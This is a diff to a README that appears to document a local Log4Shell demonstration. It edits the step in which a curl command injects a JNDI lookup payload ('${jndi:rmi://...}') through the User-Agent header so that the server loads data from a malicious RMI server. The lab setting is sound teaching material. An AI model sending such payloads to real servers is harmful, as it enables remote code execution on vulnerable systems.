@@ -61,7 +61,7 @@ The original website is opened in your browser.
 ### 5. Inject a vulnerable JNDI over the "User-Agent" header 
 
 ```bash
-curl http://localhost:8080/hello --header 'User-Agent: ${jndi:rmi://127.0.0.1:1099/WannaCry}'
+curl http://localhost:8080 --header 'User-Agent: ${jndi:rmi://127.0.0.1:1099/WannaCry}'
 ```
 
 The website gets updated with the data provided from malicious RMI server that has been started in the first step.
